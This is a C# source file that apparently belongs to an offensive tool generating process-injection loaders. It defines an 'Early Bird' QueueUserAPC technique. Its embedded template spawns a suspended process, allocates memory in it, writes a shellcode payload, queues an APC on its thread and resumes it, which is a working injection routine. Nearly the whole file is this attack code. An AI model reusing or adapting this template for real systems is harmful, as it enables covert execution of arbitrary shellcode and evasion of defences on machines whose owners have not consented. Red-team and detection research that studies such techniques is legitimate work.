using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class EarlyBirdQueueUserAPC : ITechnique
    {
        string ITechnique.TechniqueName => "EarlyBirdQueueUserAPC";

        string ITechnique.TechniqueDescription => "This method creates a new process in a suspended state. Once resumed, the target process checks the APC queue and executes the shellcode";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html",
            @"https://modexp.wordpress.com/2019/08/27/process-injection-apc/",
            @"https://learn.microsoft.com/en-gb/windows/win32/sync/asynchronous-procedure-calls"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAllocEx", "CreateProcess", "WriteProcessMemory_ByteArray", "OpenThread", "QueueUserAPC", "ResumeThread"};
        
        List<string> ITechnique.Prerequisites => new List<string>() { "SpawnProcess" };
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            STARTUPINFO sInfo = new STARTUPINFO();
            PROCESS_INFORMATION sPI;
            CreateProcess({{SPAWNPROCESS}}, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref sInfo, out sPI);
            IntPtr hAlloc = VirtualAllocEx(sPI.hProcess, IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            IntPtr NumByteWritten = IntPtr.Zero;
            WriteProcessMemory(sPI.hProcess, hAlloc, payload, (uint)payload.Length, out NumByteWritten);
            IntPtr hThread = OpenThread(0x0010, false, (int)sPI.ThreadId);
            {{PROTECT}}
            QueueUserAPC(hAlloc, hThread, IntPtr.Zero);
            ResumeThread(sPI.hThread);
        }
        {{ARGS}}
        {{INVOKE}}

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(sPI.hProcess, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
